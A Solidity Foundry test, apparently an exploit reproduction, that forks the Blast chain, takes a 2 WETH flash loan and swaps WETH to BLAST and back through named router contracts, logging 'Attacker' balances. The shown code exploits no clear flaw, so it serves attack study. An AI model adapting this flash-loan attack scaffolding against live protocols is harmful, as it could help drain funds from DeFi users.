// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC3156FlashBorrower.sol";
import "../interface.sol";

interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

interface Uni_bladerouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 limitSqrtPrice;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract AllienFlashTest is IERC3156FlashBorrower, Test {
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    IERC20 usbd = IERC20(0x4300000000000000000000000000000000000003);
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    Uni_bladerouter bladerout = Uni_bladerouter(0x9b6D09975E29D1888b98B83e31e72c00bC4D93C5);
    Uni_Router_V2 ThrusterRouter = Uni_Router_V2(0x337827814155ECBf24D20231fCA4444F530C0555);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 9795165);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker usbd before supply", weth.balanceOf(address(this)), 18);

        address token = address(weth);
        uint256 amount = 2 * 10**18;

        lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee3,
        bytes calldata data
    ) external override returns (bytes32) {
        require(address(_token) == address(weth), "Token mismatch");
        require(initiator == address(this), "Incorrect initiator");
        emit log_named_decimal_uint("WETH balance before swap", weth.balanceOf(address(this)), 18);

        swapwethToBlast();
        swapttoweth();

        // Repay the loan
        require(weth.approve(address(lender), weth.balanceOf(address(this))), "Approval failed");

        emit log_named_decimal_uint("[Begin] Attacker after paid", weth.balanceOf(address(this)), 18);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function swapttoweth() internal {
        blast.approve(address(ThrusterRouter), blast.balanceOf(address(this)));
        weth.approve(address(0x9b6D09975E29D1888b98B83e31e72c00bC4D93C5), weth.balanceOf(address(this)));
        blast.approve(address(0x9b6D09975E29D1888b98B83e31e72c00bC4D93C5), blast.balanceOf(address(this)));

        address tokenIn = address(blast);
        address tokenOut = address(weth);
        address recipient = address(this);
        uint256 deadline = block.timestamp + 30; // Set a valid deadline
        uint256 amountIn = blast.balanceOf(address(this)); // Ensure this is greater than zero
        uint256 amountOutMinimum = 1; // Adjust based on market conditions
        uint160 limitSqrtPrice = 0;

        Uni_bladerouter.ExactInputSingleParams memory params = Uni_bladerouter.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            recipient: recipient,
            amountIn: amountIn,
            amountOutMinimum: amountOutMinimum,
            limitSqrtPrice: limitSqrtPrice,
            deadline: deadline
        });

        // Attempt the swap
        uint256 amountOut = bladerout.exactInputSingle(params); 
        emit log_named_decimal_uint("WETH balance after swap", weth.balanceOf(address(this)), 18);
        emit log_named_uint("Amount out received:", amountOut);
        emit log_named_decimal_uint("Amount out for weth after last swap:", weth.balanceOf(address(this)), 18);
    }

    function swapwethToBlast() internal {
        weth.approve(address(bladerout), weth.balanceOf(address(this)));

        address tokenIn = address(weth);
        address tokenOut = address(blast);
        address recipient = address(this);
        uint256 deadline = block.timestamp + 30; // Set a valid deadline
        uint256 amountIn = weth.balanceOf(address(this)); // Ensure this is greater than zero
        uint256 amountOutMinimum = 1;
        uint160 limitSqrtPrice = 0;

        Uni_bladerouter.ExactInputSingleParams memory params = Uni_bladerouter.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            recipient: recipient,
            amountIn: amountIn,
            amountOutMinimum: amountOutMinimum,
            limitSqrtPrice: limitSqrtPrice,
            deadline: deadline
        });

        // Attempt the swap
        uint256 amountOut = bladerout.exactInputSingle(params); 
        emit log_named_decimal_uint("WETH balance after swap", weth.balanceOf(address(this)), 18);
        emit log_named_uint("Amount out received:", amountOut);
    }
}
